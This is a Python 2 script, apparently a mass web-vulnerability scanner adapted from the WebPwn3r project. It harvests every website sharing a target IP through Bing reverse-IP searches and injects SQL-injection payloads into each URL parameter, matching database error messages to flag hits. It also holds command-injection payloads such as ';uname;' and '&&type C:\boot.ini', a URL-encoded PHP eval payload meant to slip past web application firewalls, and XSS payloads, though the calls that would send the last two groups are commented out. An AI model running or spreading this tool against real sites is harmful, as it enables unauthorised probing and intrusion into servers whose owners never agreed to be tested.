#!/usr/bin/env python

# server websites sqli injection checker
# v1.2 detecting parameters 
# Got Some codes and ideas from WebPwn3r Project (a good one)

import urllib2 , os , sys , re
from platform import system

class colors():
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'

if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')

logo = '''
\t+----------------------------------------------------------------------------+
\t| Extension to Webpwn3r project : Find (SQLi, XSS, RCE) bugs in grabbed urls |
\t|                         from bing reverse with id drok                     |
\t|                             Author : MatriX Coder                          |
\t+----------------------------------------------------------------------------+
'''

print(colors.BLUE + logo + colors.ENDC)

try:
    def rce_func(url):
        # Remote Code Injection Payloads
        payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
        # Below is the Encrypted Payloads to bypass some Security Filters & WAF's
        payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
        # Remote Command Execution Payloads
        payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
        # used re.I to fix the case sensitve issues like "payload" and "PAYLOAD".
        check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
        #main_function(url, payloads, check, 'rce')

    def xss_func(url):
        #Paylod zigoo="css();" added for XSS in <a href TAG's
        payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
        payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
        check = re.compile('zigoo0<svg|x>x', re.I)
        #main_function(url, payloads, check, 'xss')

    def error_based_sqli_func(url):
        # Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'  Yeaa let's bug the query :D :D
        # added chinese char to the SQLI payloads to bypass mysql_real_escape_*
        payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
        check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
        main_function(url, payloads, check, 'sqli')

    def main_function(url, payloads, check, bug):
        #This function is going to split the url and try the append paylods in every parameter value.
        for params in url.split("?")[1].split("&"):
            #sp = params.split("=")[0]
            for payload in payloads:
                try:
                    #bugs = url.replace(sp, str(payload).strip())
                    bugs = url.replace(params, params + str(payload).strip())
                    #print bugs
                    html = urllib2.urlopen(bugs).readlines()
                    for line in html:
                        checker = re.findall(check, line)
                        if len(checker) !=0:
                            print "\t" + colors.GREEN+bug+colors.ENDC + " ==> " + url
                except:
                    pass

    ips = open(sys.argv[1], 'r').readlines()
    for ip in ips:
        ip = ip.rstrip()
        print "[*] Target ==> %s" % ip    
        lista = []
        s = ip
        page = 1
        print('\n')
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A"+s+"+id=&count=50&first="+str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
                for i in range(len(findwebs)):
                    x = findwebs[i]
                    lista.append(x)

                page = page + 50
                for site in lista:
                    vulnz = []
                    #try:
                    print "Testing -> " + site
                    rce_func(site)
                    xss_func(site)
                    error_based_sqli_func(site)
                    #except:
                     #   pass
            except:
                pass
except IndexError:
    print "[*] Usage : python "+sys.argv[0]+" file.txt"
